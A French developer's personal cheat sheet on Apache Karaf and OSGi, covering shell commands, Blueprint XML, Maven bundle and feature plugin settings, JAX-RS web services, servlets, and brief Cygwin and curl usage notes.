    |_deploy:deploye les artifacts qui sont là : quand on dépose ici et a chaud ou au demarrage ça prend en compte ici override l'equivalent sous system/ si il existe. ON peut y mettre des jar(OSGI ou pas), des war(OSGI ou pas) des features.xml des .kar des spring.xml (C PAS BIEN pour le dev : passer plutot par addons)
    |         se base sur des classes Deployers : on peut créer notre propre Deployer.
    |_addons (a creeer si il n'existe pas)
    |_etc: fichiers de config. Tous les *.cfg sont loades par karaf quand demarre. Modifier un de ces fichiers ne necessite pas de redemarrage: c'est recharge à chaud voir LINK88___     
    |    |_shel.init.script //Je peux creer mes scripts dans etc/shell.init.script : ce fichier est recharge quand je redemarre karaf permet de faire des alias raccourcis (je peux ecrire sur plusieurs lignes entre des accolades)
    |    |_users.properties // JAAS est là par defaut on peut faire facilement des login modules authentification et authorisation ldap jdbc.. comment?....
    |    |_acl.properties // AccessControlList    
    |_instances:voir LINKkarafinstance
    |_lib:core librairies
    |_system:bundles systeme
    
    commandes:
        aide: ajouter --help        
        quitter: depuis le shell shutdown -r -f ou logout ou ctrl+d. Depuis externe: karaf stop ou bin/stop.bat ou killer-9 le process 
        karaf.bat clean ou karaf clean //reset: à partir de windows cmd. Pour debuger ajouter "debug" et aller sur intellij>run>>editConfiguration>remote>+>debug start
        la :shows all installed bundles (marche pas ?)
        list	ou bundle:list //Show user bundles
        package:exports -p org.apache.xml.security / pour voir quel bundle  exporte ce package.
        package:exports -b 373 (numero bundle) pour voir quels package exporte ce bundle
        bundle:list | grep -v Active | wc -l // pratique au demarrage pour voir le nombre de bundle qui ont fini de demarrer
        addon:list // liste des addons: les addon ne sont que des bundles ou des kars. On peut donc les voir aussi tel que ça.
        bundle:list | grep usermanager (son statut doit être active) >>>verifier qu'il est actif
         bundle:list -l numerobundle pour voir où location detail est situe le bundle si je ne le vois pas non visible faire
         bundle:list -t 0 (c a d liste moi à partir du tag 0 le niveau ou on voit tous les bundles car par defaut list utilise le tag 80 qui cache les tags de basse couche) 
        addon:install C:/Temp/myusermanager.jar //installer bundle xxx
        arreter un addon:
          list | grep nomdemonaddon : prendre le numero
          puis 
          stop numero trouve : Attention pas terrible ne pas utiliser mais carrement desinstaller sinon les bundle qui le referencent continuent à le referencer. LINKkarfstop
        service:list NomDeL'InterfaceDuService //Shows the active OSGi services. Possible faire | grep mais bof puisqu'on peut mettre le nom de l'interface
        exports Shows exported packages and bundles providing them. This helps to find out where a package may come from.
        config:list pour voir toutes les confs voir LINK88___ ATTENTION!! il ne se raffraichit pas bien et on ne voit pas la realité quand un manipule les bundles à chaud. quand y en a plusieurs pareils qui se suivent c'est le dernier en bas qui est pris en compte par les bundles.
        config:edit org.ops4j.pax.url.mvn.repositories = http://repo1.mav......//Je n'ai pas reussi à modifier la config en ligne de commande comme ça :
        dev puis system:property uneproprietesysteme pour voir la propriete systeme (possible setter aussi) 
        feature c juste un .xml (peut etre genere par pom.xml voir LINKkarfeature) qui depend d'autres features, qui contient des artifacts dont les bundles et les addons font partie, et des fichiers de conf: c pour regrouper les bundle et tous les installer d'un coup dans la console + recup des conf dans maven pour les installer qqpart dans l'assembly final. un .kar est juste un zip avec le feature.xml et tous ses bundle dedans. un kar ne doit pas contenir de "." dans l'artifactId
              on peut creer des features qui rajoute des commandes au shell karaf
        feature:info nomartifact?bundle// pour avoir l'arbre de dépendances des features
        feature(s):repo-add camel 2.15.2 //cree camel dans ma feature:list ET dans mon repository maven embarqué karaf.
        ou
        feature(s):repo-add mvn:net.lr.tasklist/tasklist-features/1.0.0-SNAPSHOT/xml (cree nouvelle feature à partir de mon repository maven: pour faire ça besoin faire setenv MAVEN_HOME je crois)
        puis
        feature(s):list Shows which features are installed and can be installed. (NOMSX) si y a un x en 3e colonne c que le feature est deja installe
        puis
        feature(s):install NOMS1 NOMS2 NOMS3... et DEMARRE le serveur et ca les rajoute(pas toujours) dans "list"
        faature:install jndi // jndi est preinstallé: pour l'installer.Tous les services OSGI deviennent alors dispo par un nom jndi. Utile pour une ancienne application déployée sur karaf qui a besoin de services osgi: on passe alors par jndi
        feature(s):install webconsole //Install features (a list of bundles and other features). Ici installe la console karaf
                                    accessible sur http://localhost:8181/system/console/http karaf/karaf . Log in with karaf/karaf and take some time to see what it has to offer.
                                    on a accès à la console karaf prompt aussi de la sur le lien gogo
        feature(s):install decanter // pour faire du benchmark mesurer les perfs c'est une console web elasticsearch+kibana(par defaut)
        features:install war ça installe je crois PaxWeb est un projet qui embed des serveurs web dans des bundles (war est le nom de l'artefact maven). Peut etre besoin d'abord de faire features:addurl mvn:groupid/artifact/version/xml/features
        feature:install jdbc // des lors de nouvelles commandes jdbc sont dispos dans le shell: creer une base de donnee: jdbc:create --help
        feature:install cxf // pour les webservices rest(jax-rest=jax-rs), soap(jax-ws),databinding(jaxb)... les annotations sont alors dispos. quand un webservice appelle la methode d'une classe d'un autre webservice, ce n'est pas à ce dernier de renvoyer la reponse mais bien au webservice initial sinon KO
        feature:install activemq //pour jms  
        feature(s):start demarre un feature déjà installe
        voir une variable: shell:env nomdemavariable exemple: shell:env karaf.etc karaf.base karaf.data etc...
        shell:env karaf.version connaitre la version de karaf
        bundle:tree-show idbundle// voir l'abre des dependances des bundles  (det idbundle avec list)
            karaf a un repo maven embarque. d'abord cherche dans son repo embarqué, ensuite dans  le repository local puis dans les repos declares dans la config:org.ops4j.pax.url.mvn.repositories                             
        bundle:install je ne peux pas installer un .kar avec ça! je peux le faire avec addon:install ou feature:install
        bundle:install -s mvn:org.apache.camel/camel-example-osgi/2.15.2 (-s pour demarrer le bundle apres installation) //meme si c'est en local on met mvn: c'est pour mettre l'identité de l'artifact (c a d que c'est sous /system)
        bundle:install -s mvn:net.lr.tasklist.tasklist/1.0.0-SNAPSHOT
        bundle:install -s file:D:/Profiles/lduverge/.m2/repository!com.soprahr.hub.bc.usermgt.com.soprahr.hub.bc.usermgt.model/1.1.10
        bundle:install -s mvn:net.lr.tasklist.tasklist-command/1.0.0-SNAPSHOT
        bundle:install -s mvn:com.soprahr.hub.bc.usermgt.service/0.0.0-SNAPSHOT
        bundle:install -s file:/opt/hr4youdev/app5-saml/app5-0.0.0-SNAPSHOT/system/com/idkids/com/soprahr/hub/bc/usermgt/com.soprahr.hub.bc.usermgt.service/0.0.0-SNAPSHOT/com.soprahr.hub.bc.usermgt.service-0.0.0-SNAPSHOT.jar
        bundle:install -s file:com/soprahr/edsn/usermanager/com.soprahr.edsn.usermanager.ldapxml/1.0.0/com.soprahr.edsn.usermanager.ldapxml-1.0.0.jar
        bundle:update numero (cool met à jour direct)
            bundle:stop camel-example-osgi // Attention pas terrible ne pas utiliser mais carrement desinstaller sinon les bundle qui le referencent continuent à le referencer. LINKkarfstop
        bundle:restart numerodebut-numerofin // redemarrer une plage de bundles             
        update [num_bundle] // maj met à jour un bundle // si on le depose sous system? 
        bundle:uninstall camel-example-osgi // artifact du bundle
        bundle:uninstall 56456 // identifiant premiere colonne quand on fait bundle:list
        
        classes | grep NomDuneClasse : affiche la liste des classes dans le karaf
        classes idbundle  : affiche la liste des classes d'un bundle
        pour avoir les details d'une classe : 
        find-class nomdemaclasseSansPointClasse
         addon:install /apf/rec/Espace/add-ons/com.soprahr.edsn.usermanager.ldapxml-1.0.3.jarOukar >> installer un jar bundle osgi ou un kar feature dans karaf
         addon:list >>>verifier qu'il est bien installe et qu'il tourne
         list | grep usermanager (son statut doit être active) >>>verifier qu'il est actif
         list -l (ou -t?) numerobundle pour voir où location detail est situe le bundle 
         stop 248 (pid) >>>pour stopper un service : (marche pas bien) LINKkarfstop 
         pour stopper karaf: ctrl+d sur la console. Pas trouvé mieux. sinon killer le process java
         addon:uninstall com.soprahr.edsn.usermanager.ldapxml-1.0.3.jar  >>>desinstaller si besoin :
        headers numerobundle: pour voir le manifest                                   
        diag numeroBundleFacultatif //Show diagnostic detail information for bundles that could not be started: pour voir quelles dependances il n'arrive pas à trouver: raison pour laquelle un bundle est en "gracePeriod"
        log:tail	Show the log. Use ctrl-c to  go back to Console
        jaas:realm-list pour voir la liste des realms: le loginmodule déclaré dans <jaas:config>dans blueprint.xml de mon budle va créer le login module dans karaf
        instance:start xxx(root) //LINKkarafinstance on peut créer pour un seul repertoire karaf plusieurs instances independantes mais avec lesquelles on peut partager des choses entre elles. (pas besoin de faire un copier-coller de tout le repertoire karaf pour faire une nouvelle instance.)
              grace à jmx (etc/org.apache.karaf.management.cfg) on peut voir les instances, les bundles...
        http:list pour lister les servlets (l'id premiere colonne est l'id du bundle qui expose la servlet) 
        web:list pour lister toutes les applis web war qui sont ici des wab c'est un war avec /MANIFEST/OSGI/blueprint.xml qui peut meme s'appeler .monwartoto mais structure comme un war)
                  les urls sont des webcontext pas des urls l'ID est l'id du bundle qui est un war qui expose cce web-context "/chose"
    main/resources/OSGInomquejeveux/blueprintQuejePeuxAppelerCommejeVeux.xml :
                      <?xml version="1.0" encoding="UTF-8"?>
                            <blueprint xmlns="http://www.osgi.org/xmlns/blueprint/v1.0.0"
                             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                             xmlns:cm="http://aries.apache.org/blueprint/xmlns/blueprint-cm/v1.1.0" // recup proprietes LINKmethode1: recupère dans un .cfg qui est sous le homeDeKaraf/etc et crée des ${variable}
                             xmlns:ext="http://aries.apache.org/blueprint/xmlns/blueprint-ext/v1.0.0" //LINKmethode2 pour recuperer les propriétés systeme uniquement. (-D)                              
                             xsi:schemaLocation="http://www.osgi.org/xmlns/blueprint/v1.0.0 http://www.osgi.org/xmlns/blueprint/v1.0.0/blueprint.xsd
                          http://aries.apache.org/blueprint/xmlns/blueprint-cm/v1.1.0 http://aries.apache.org/schemas/blueprint-cm/blueprint-cm-1.1.0.xsd">
                           <cm:property-placeholder persistent-id="com.soprahr.edsn.usermanager.icdc_edsn_authentification_webservice" // fichier de conf sous etc/ =monprojet\src\main\resources\com.soprahr.edsn.usermanager.icdc_edsn_authentification_webserviceQuiPeutContenirDesProprietesSystemeDans${propsys}.cfg //LINKmethode1
                                                                                                              update-strategy="reload">// pour un rechargement auto des configs quand on les modifie
                              placeholder-prefix="${unprefix"     // facultatif: c de la merde.. pour mettre dans ce meme fichier un prefixe et suffixe. Je ne vois pas l'interet 
                              placeholder-suffix="unsuffixe}"> // facultatif
                                        <cm:default-properties> // facultatif: pour definir des proprietes par defaut si pas trouve
                                  			<cm:property name="readProcessName" value="" />
                                    </cm:default-properties>                les propriétés systemes -D sont récupéré par ${ma.propriete.systeme} mais ça on ne peut le mettre que dans les .cfg chargés par le placeholder. Pas dans les xml blueprint sauf si j'utilise le ext LINKmethode2
                          </cm:property-placeholder> Puis dans le bean: 
                              <bean id="webserviceEdsnUserManager" class="com.soprahr.edsn.usermanager.webservice.WebserviceEdsnUserManager" init-method="init"> Dans ce bean les propriétés sont injectées
                                    <property name="userFilePath" value="${userFilePathCestUnString}" /> // attention: ne se set dans le bean qu'après l'execution du constructeur du bean!! dans l'ordre: constructeur>setters/getters>methode init-metod. Attention : "true" dans bundle.xml set bien des booleans pas des strings. (donc ne pas mettre =true sans guillemets 
                                    <property name="userFilePath" ref="identifiantd'unautrebean" /> // Il y a aussi ca mais je n'ai jamais utilisé et sais pas ou mettre : @Properties pour exporter des proprietes aux autres services osgi: @Properties(@Property(name = "service.exported.interfaces", value = "*"))
                                    ...ATTENTION à la déclaration de l'ordre des beans: respecter l'ordre et en plus mettre depends-on pour être tranquille
                              </bean>
                            <ext:property-placeholder/>(ne prend pas d'autre arguments) // LINKmethode2 : du coup tout ce qui est #sys[unevariablesysteme] dans CE fichier xml est remplacé (besoin mettre en tête :xmlns:ext="http://aries.apache.org/blueprint/xmlns/blueprint-ext/v1.0.0" )                          
                          
                          	<cxf:bus id="cxfBus1Facultatif"> // pour activer les webservices=filtres voir LINK78930943 
                              		<cxf:features>
                              			<cxf:logging /> // ici je dis j'active le log debug sur le bus cxf // pour voir list les webservice: http://.../cxf et http://.../cxf/lAttributAdressDejaxrs:serverDansLeBludPrint?_wadl pour voir le detail du webservice (Q'un seul underscore!)
                              		</cxf:features>
                              	</cxf:bus>
                          <service ref="webserviceEdsnUserManager" interface="com.soprahr.edsn.usermanager.EdsnUserManager" ranking="1" availability="optional" pour indiquer qu'il nest pas forcement necessaire de trouver le service-classe qui implemente cette interface /> // cela expose mon bean webserviceEdsnUseManager defini plus bas dont l'interface est EdsnUserManager. recuperable par <reference. ranking ordre de chargement: charge 299 avant 0. A chaud en installant les bundles des fois ce n'est pas bien pris en compte: il faut redemarrer karafEquivalent en java: @OsgiServiceProvider will expose the bean as an OSGi service 
                          <jaxrs:server id="unnom???utiliseoù???" address="/debutdelurl"> voir LINK93029 pour voir la classe // pour faire un webservice ou un websocket
                                  <jaxrs:serviceBeans>
                                    <ref component-id="idDeMonBeanQuiSeraUnWebservice"/> //voir LINK93029 pour voir la classe
                                    <ref component-id="idDeMonBeanQuiSeraUnWebservice2"/> //on peut mettre  une deuxième classe webservice.voir LINK93029 pour voir la classe 
                                  </jaxrs:serviceBeans>
                              		<jaxrs:providers> // pour que mon webservice renvoie du xml ou du json
                               			<bean id="jacksonProvider" class="org.codehaus.jackson.jaxrs.JacksonJsonProvider" /> // pour que mon webservice gère le json
                               			 ou
                                     <bean class="org.apache.cxf.jaxrs.provider.StreamingResponseProvider" /> //  pour que ce soit un websocket
                               			<ref component-id="UserContextfilter" /> // rajouter ce filtre à mon webservice UserContextfilter est un bean (ou je crois une reference donc un service)
                                 </jaxrs:providers>
                          </jaxrs:server>
                                <bean id="idDeMonBeanQuiSeraUnWebservice" class="classe.qui.implemente.Uneinterface"> voir LINK93029 pour la classe
                                 <property name="featuresService" ref="idDuReferenceAppeleLINK9392934"/>
                                </bean>
                                <reference id="idAppelableParRefDansUnAutreBeanPourQuIlLutiliseLINK9392934" interface="org.apache.karaf.features.FeaturesService"/>// peut etre utilise dans un bean dans son <property name="featuresService" ref="idAppelableParRefDansUnAutreBeanPourQuIlLutiliseLINK9392934": celui ci sert à recuperer des infos sur les features du karaf. 
                          pour se connecter a une base de donnee: premiere methode :
                        		<bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
                                            <!--  <property name="url" value="jdbc:mysql://localhost:3306/person"/> -->
                                            <!--  <property name="driverClassName" value="oracle.jdbc.driver.OracleDriver" /> -->
                                            <property name="url" value="${datasource.jdbc.url}"/>
                                            <property name="username" value="${datasource.user}"/>
                                            <property name="password" value="${datasource.password}"/>
                                        </bean>
                           deuxieme methode:
                                      <reference id="dataSourceDsn" interface="javax.sql.DataSource" filter="(osgi.jndi.service.name=jdbc/dsnmanagedds)"/> // la conf de la base de donnée se trouve dans com.soprahr.edsn.datasource.cfg
                                      <reference id="dataSourceHr" interface="javax.sql.DataSource" filter="(osgi.jndi.service.name=jdbc/hraccessds)"/> // peut etre utilise dans un bean dans son <property name="dataSourceHr"
                                                                                            filter="(language=*)" cardinality="1..n" ou "1..1" ou "0..1" policy="dynamic" ou static bind="nomMethodeDansAutreServiceExecuteeQuandMonServiceEstRajoute" unbind="nomMethodeDansAutreServiceExecuteeQuandMonServiceEstRetire"/>
                  
                         pour faire une servlet: LINKkarafservlet // attention je crois que le contexte des servlets est séparé de cxf
                          <bean id="com.soprahr.hub.bc.usermgt.service.sso.servlet.SAMLAuthRequestServlet" class="com.soprahr.hub.bc.usermgt.service.sso.servlet.SAMLAuthRequestServlet" depends-on="ssoSamlPropertiesSingleton.Deconseille:plutot mettre dans l'ordre" init-method="initialize">
                              		<property name="ssoSamlPropertiesSingleton" ref="ssoSamlPropertiesSingleton" />
                          </bean>
                          <service ref="com.soprahr.hub.bc.usermgt.service.sso.servlet.SAMLAuthRequestServlet" interface="javax.servlet.http.HttpServlet">
                              		<service-properties>
                              			<entry key="alias" value="/sso"></entry> // ca ca va être l'url de ma servlet
                              		</service-properties>
                              	</service>                                         
                          pour definir un login module jaas : (c'est l'equivalent du fichier jaas.conf)
                           <jaas:config name="nomdeMonLoginModuleAppeleParLoginContext" rank="1"> // rank: si plusieurs logins modules ont le meme nom rank permet de donner un ordre d'execution
                                      <jaas:module className="org.apache.karaf.jaas.modules.properties.PropertiesLoginModule" flags="required">
                                                              org.apache.karaf.jaas.modules.krb5.Krb5LoginModule
                                          param1 = $[karaf.base]/etc/users.properties // valeur. Par contre ici helas pas reussi a mettre ${une.variable} avec placeholder... AFAIRE:reussi ? 
                                          ...
                                      </jaas:module>
                                  </jaas:config>                          
                      </blueprint> 
    maven ecrit dans MANIFEST :1:deployementdependencies( librairie jars inclus) 2:servicesdependencies(autres services dans le system Pe absent)
      monservice.xml:
      <component name="nomDeMonService" immediate="true">
        <implementation class="package.MaClasseQuiDoitImplementerInterfaceJeNeSaisPas">
             <reference // ??? ranking ordre de chargement: charge 299 avant 0
                name="AutreServiceDontCeServiceAbesoin"
                interface="package.ClasseService"
                filter="(language=*)"
                cardinality="1..n" ou "1..1" ou "0..1"
                policy="dynamic" ou static
                bind="nomMethodeDansAutreServiceExecuteeQuandMonServiceEstRajoute" 
                unbind="nomMethodeDansAutreServiceExecuteeQuandMonServiceEstRetire"
        />
        </component>
        @OsgiServiceProvider will expose the bean as an OSGi service
        @Properties pour exporter des proprietes aux autres services osgi
              @Properties(@Property(name = "service.exported.interfaces", value = "*"))

    Dans maven besoin:
    pom.xml parent 
      <packaging>pom</packaging>
          <modules>
            <module>artifactid du pom.xml du sousrepertoire1</module>
            <module>artifactid du pom.xml du sousrepertoire2</module>
        </modules>
            fils1:sousrepertoire1: pom.xml BUNDLE <packaging>bundle</packaging>
              <plugin>     sert à creer le fichier META-INF/MANIFEST.MF (sinon on l'aurait fait à la main)
                    <groupId>org.apache.felix</groupId>
                    <artifactId>maven-bundle-plugin</artifactId> // sert à creer le fichier META-INF/MANIFEST.MF (sinon on l'aurait fait à la main)
                    <version>3.2.0</version>
                    <extensions>true</extensions>                   //---> creee un jar ou un war                                             
                    <configuration>
                        <obrRepository>NONE</obrRepository>
                        <instructions>
                            <_include>-bnd.bnd</_include>
                              <Bundle-SymbolicName>${project.artifactId}</Bundle-SymbolicName>
                              
                              <_noee>true</_noee> // mettre ça p our que dans MANIFEST-MF il ne mette pas Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.8))" ce qui peut causer cette erreur. Si meme quand on utilise la bonne version java dans le projet il continue c'est que j'utilise une classe d'une version suivante
                              <Export-Package>packages.visibles.par.dautres.bundles?.toto.*;version="${project.version}<Export-Package>  // du coup dans META-INF/MANIFEST.MF il doit y avoir les Imports exports...3rd party jar doivent être dedans 
                              N'oublie pas les virgules ci dessous!!!! a chaque fin de ligne sinon il n'ajoute pas dans le MANIFEST.MF
                              <Import-Package>, PackagesDECEBUNDLE + packageDependencyDeclareesIciOuExportes.ailleurs.dans.dautres.bundlesdanskaraf.ou.librairies3rdPartyALaRacineDuBundle.OuMemeDansJava.DontLesClassesDeCeBundleOnt.besoin.*(ne pas mettre * si le nom du package est complet!),package.que.si.pas.la.plugin.maven.fait.erreur(Uneresolved constraint ou Class not found ou Unable to load class).*;version(facultatif)=${project.version} ou x.y ou version="[${bc.websocket.version},5.0.0]" ou !(si erreur/version),un.autre*;version="[2,4)",!package.DontLesClassesDeCeBundle.n'ont.pasbesoin.qu'ilnefautpasimporterMaisAUtiliserQuenDernierRecoursEnEtantExaustifDansLesImports(parexemple si erreur  missing requirement [326.0](osgi.wiring.package=packageNonTrouverAExclure)),*</Import-Package> Si je ne met rien c'est comme si je faisais <Import-Package>*</Import-Package>: il ajoute toutes les dependances dans le manifest dans "Import-Package:" et en deduit lors de déploiement dans karaf <Import-Bundle> qui en découle avec possiblités de doublons(appelle deux bundle). lors du deploiement il regarde si les packages declares dans <import-package> existent et si non il fait une erreur osgi.wiring.package. attention reste silencieux lors du deploiement même si manque une classe dans karaf necessaire dans ma classe : il mettra alors le bundle au statut gracePeriod. Voir quelle classe manque en faisant "diag"
                                   AFAIRE:Capitaliser                 regarder les imports dans les manifests des jars
                                                                      si un import manque je peux soit le renier soit ajouter une dependence dans mon pom
                                                                      chercher trouver un package dans repository maven local recherche textuellee
                                                                      si erreur VEUT DIRE QUIL ne trouve pas ce package à cette version dans les imports-package: donc soit changer de version avec une existante dans karaf qui est exportée soit embeded la bonne version de l'artifact qui contient ce package
                                                                      Sinon exclure avec ! :                                                                       
                                                                      <Import-Package>
                                                                                                  !com.werken.xpath, sans * si fin path package
                                                                                                  !org.apache.log*, sinon add * (si marche toujours pas mettre les paths sans * du coup yen a bcp a mettre)
                                                                                                  !org.apache.tools*,
                                                                                                  !org.apache.oro*,
                                                                                                  !org.jdom*,
                                                                                                  !groovy.lang*,
                                                                                                  !org.codehaus.commons.compiler*,
                                                                                                  *
                                                                                              </Import-Package>
                                si j'ai Missing dependencies:(objectClass=x.y.UneInterfaceQuiEstPourtantBienPresenteDansMonBundle) c'est parce qu'il ne trouve pas le service-classe qui l'implemente. Alors mettre <reference ... availability="optional" pour indiquer qu'il nest pas forcement necessaire de trouver le service-classe qui implemente cette interface
                                si j'ai Failed to execute goal org.apache.maven.plugins:maven-enforcer-com.soprahr.hub.bc.websocket.service;version=4.0.0	 does not have proper version declaration
                                                            il faut mettre la version dans cette forme: version="[${bc.websocket.version},5.0.0]", (minimum,maximum quoi...)                              
                                
                              <Embed-Dependency>ArtifactIdSuffitSinonGroupIdArtifactIdVersion,uneAutrejavax.servlet.jsp.jstl-api</Embed-Dependency> // artifactid1,artifactid2,...possible mettre * si y en a bcp. Tout ce qui est là doit être aussi dans les dependances. Ce sera embarque dans le bundle ALaRacineDuBundle en librairies3rdParty: ca rajoute dans manifest : Bundle-ClassPath: ... Embed-Dependency: ... Embedded-Artifacts: ...
                              ou bien <Embed-Dependency>*;scope=compile|runtime</Embed-Dependency> pour mettre les dependances et transitives sans celles utiles pour les tests
                              <Embed-Transitive>true</Embed-Transitive> // facultatif: ajoute les dependances transitives dans le bundle. celles qui sont pas dans mon pom directement ajoute Embed-Transitive: true dans meta-inf
                                      Unable to resolve 325.0: missing requirement [325.0] osgi.wiring.package; (osgi.wiring.package=javax.resource) // c'est ce qui est apres wiring.package= qui indique le package qui manque: trouver dans quel artifactmaven il est et         
                              <_wab>src/main/webapp</_wab>
                              <Web-ContextPath>/customloginform</Web-ContextPath> // dans le pom. Si mon bundle est une webapp alors son path url sera /customloginform (se retrouve dans META-INF/MANIFEST.MF) et on pourra faire ServletContext context = request.getServletContext().getContext("/customloginform"); puis context.getRequestDispatcher("/login").forward(request, response); url d'un controlleur LINKçç("'"'
                        </instructions>
                    </configuration>
                </plugin>
                      <plugin> // ce plugin sert à déployer dans mon repository des fichiers de configuration directement : utile pour les features voir Linkfeatureconfig
                  <groupId>org.codehaus.mojo</groupId>
                  <artifactId>build-helper-maven-plugin</artifactId>
                  <version>1.9.1</version>
                  <executions>
                  <execution>
                      <id>attach-sso-kerberos-conf</id> // nom que je veux
                      <phase>package</phase>          // toujours cette phase
                      <goals>
                          <goal>attach-artifact</goal> // toujours ça.
                      </goals>
                      <configuration>
                          <artifacts>
                              <artifact>
                                  <file>src/main/resources/conf/com.soprahr.edsn.usermanager.spnego.sso.cfg</file> // chemin fichier de conf à copier (chemin a partir racine projet)...
                                  <type>cfg</type>
                                  <classifier>com.soprahr.edsn.usermanager.spnego.sso</classifier> // ... vers le repository maven lors de l'install avec le nom "com.soprahr.edsn.usermanager.spnego.sso"".cfg" car <type>cfg</type>
                              </artifact>
                          </artifacts>
                      </configuration>
                  </execution>
                  </executions>
                  </plugin>
                </build>
                <!-- CXF --> //deux dependances necessaires pour faire des filtres = webservices dans karaf LINK78930943
                <dependencies>
              		<dependency>
              			<groupId>org.apache.cxf</groupId>
              			<artifactId>cxf-rt-frontend-jaxrs</artifactId>
              		</dependency>
              		<dependency>
              			<groupId>javax.ws.rs</groupId>
              			<artifactId>javax.ws.rs-api</artifactId>
              		</dependency>
              		<!-- pour faire une servlet -->
              		                      LINKkarafservlet
                    <dependency>
                    				<groupId>javax</groupId>
                    				<artifactId>javaee-web-api</artifactId>
                    				<version>7.0</version>
                    				<scope>provided</scope>
                   </dependency>
                   ou bien               		                      
              		<dependency>
                			<groupId>javax.servlet</groupId>
                			<artifactId>servlet-api</artifactId>
                			<scope>provided</scope>
                		</dependency>
              LINKkarfeature fils2:sousrepertoire2 pom.xml FEATURE(ne doit pas être un pom parent) appelle des bundles//--> cree un .kar (maven:avt de builder le kar il faut mvn:installer les bundles pour que MANIFEST existe) ou un .zip(je crois) .kar/repository/toutes les dependances necessaires
                                      <packaging>feature ou kar</packaging>// src/main/feature.xml est genere en fonction des dependances maven. feature.xml contient une liste de mvn:group/artifactid/version de jars pouvant être crees par des sousrepertoire1 LINKkarfeature  
                                      ou                                              si j'ai déjà un src/main/feature.xml il sera completé par maven lors de la creation du kar voir Linkfeatureconfig
                                      <packaging>karaf-assembly</packaging> //cree un serveur karaf.
                          <build><plugins><plugin>     
                               <groupId>org.apache.karaf.tooling</groupId>
				                       <artifactId>karaf-maven-plugin</artifactId> goals: mvn:karaf:features-create-kar cree un .kar; karaf:assembly//cree target; karaf:archive//cree un zip; karaf:run demarre
				                       <version>3.0.3</version>
				                       <extensions>true</extensions> // mettre ça sinon je ne peux pas faire un kar
				                       <configuration>
				                        <aggregateFeatures>true</aggregateFeature>: BOF je ne vois pas de difference. Soit disant il ajoute les jars necessaires lors du build maven dans le feature(.xml?) . false(par defaut) ne fait que declarer les dependances
				                        <startupFeatures ou bootFeatures ou installFeatures><feature>x</feature><feature>unArtifactIdDeMesDependancesDeCePom</feature>unAutreArtifactIdDeMesDependancesDeCePom</xFeatures>//installe et demarre ou installe ou copie les features quand karaf demarre
				                        <includeTransitiveDependency>false</includeTransitiveDependency> // est à TRUE par defaut : les bundles en dependance 2daires qui sont dans le pom , seront rajoutés dans feature.xml ET dans le kar en tant que jar. Si c'est à false il ne met que les dependances directes et pas les dependances transitives 
                        </plugin>...
                 Linkfeatureconfig: \src\main\feature\feature.xml facultatif. complette ce que genere le pom.xml
                        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
                          <features xmlns="http://karaf.apache.org/xmlns/features/v1.2.1" name="nomAquoiIlSertSaispas">
                              <feature name="${project.artifactId}" description="${project.artifactId}" version="${project.version}">
                              <configfile finalname="${karaf.etc}/com.soprahr.edsn.usermanager.spnego.sso.cfg" override="false"> //lors de l'installation dans karaf : vers ou copier le fichier...
                                  mvn:com.soprahr.cnav.edsn.usermanager.spnego/spnego-sso/1.0.0/cfg/com.soprahr.edsn.usermanager.spnego.sso/ ... qui est dans mon repo ici grace a Linkfeatureconfig
                                     il est dans le repo xxxx/xxxx/version/ARTIFACTDUBUNDLE_A_IGNORER_ICI-VERSION-com.soprahr.edsn.usermanager.spnego.sso.cfg (he oui /cfg/ veut dire de le chercher avec le nom .cfg à la fin) 
                              </configfile>
                              </feature>
                          </features>
       
                                            
      une classe webservice karaf
      LINK93029
            	@Context                   // request et response comme ça sont automatiquement injectes
            	private HttpServletRequest httpRequest; // attention on dirait que pas possible de faire httpRequest.getParameter("x") si dans la methode en bas j'utilise @FormParam
            	@Context
            	HttpServletResponse httpResponse;

                @Path("/la_suite_de_lurl") ou @Path("/") // facultatif 
                public interface ou une classe FeaturesRestService { /// TRES IMPORTANT: la methode doit etre public sinon il ne la voit pas
                  /**
                  * Returns an explicit collection of all features in XML format in response to HTTP GET requests.
                  * @return the collection of features
                  */
                  @GET ou @POST 
                  @Path("/lafindelurl") // mettre {monparamdanspath} si on veut utiliser @PathParam("userlogin")String login ci dessous LINK5464  
                  @Produces("application/xml")
                  public Collection getFeatures( @FormParam("parametrePost") String unParametre  ) throws Exception;
                                                  ou 
                                                      @PathParam("monparamdanspath")String login mais alors attention il faut mettre LINK5464
                                                      et si besoin
                                                      @QueryParam("unChampApres?ou&DanslUrl") 
                    // ci dessous: pour recuperer un bundle complettement ailleurs dans le meme karaf en java(l'autre façon c'est d'injecter dans blueprint)
                  		BundleContext bundleContext = FrameworkUtil.getBundle(UnServiceDeCeBundleLa.class).getBundleContext();
                  		@SuppressWarnings("rawtypes")
                  		ServiceReference serviceReference = bundleContext.getServiceReference(une.classe.qui.est.un.service.dans.un.autre.bundle.AutreClasse.class.getCanonicalName());
                  		return (String) serviceReference.getProperty("UNEPROPRIETTEESETTEE_DANS_LE_BLUEPRINT_DE_CET_AUTRE_BUNDLE");
                  
                } 
                et la sous classe si c'est une interface mais bof autant faire une classe direct sans interface:
                contient juste la methode                         
                  public Collection getFeatures(@FormParam("SAMLResponse") String samlReponse) throws Exception {...} sans les annotations
               Pour fair une servlet karaf LINKkarafservlet
                   public class MetadataDisplayServlet extends HttpServlet
                  { contient les methodes post et get habituelles
   
                  
cygwin :
  Je peux aussi sur mobaxterm faire Terminal>OpenNewTab pour avoir un cygwin encore mieux
  pour installer des packages : 
    executer D:\Dev\Cygwin\setup..exe
    attention bien choisir from internet si on veut rajouter des choses.
    ograniser par cathegorie c plus simple. 
              cygwin lors de l'installation check off OpenSSH and OpenSSL. sur unix installer openssl voir https://geeksww.com/tutorials/libraries/openssl/installation/installing_openssl_on_ubuntu_linux.php
                  generer creer paire de cle sur cygwin ou sur unix voir LINK94949494
  
Curl : voir aussi wget : pour faire une requette request http
    sur cygwin (installer dans cygwin. voir cygwin) (sous categorie Net)
    get telecharger:
      curl -O https://index.taskcluster.net/v1/task/project.deepspeech.deepspeech.native_client.master.cpu/artifacts/public/deepspeech-0.1.0-cp35-cp35m-manylinux1_x86_64.whl
    post json:
    curl -H "Content-Type: application/json" -X POST -d '{"nudoss":"8714"}' http://localhost:8081/SpringRestEx/rest/badge/inputbadge
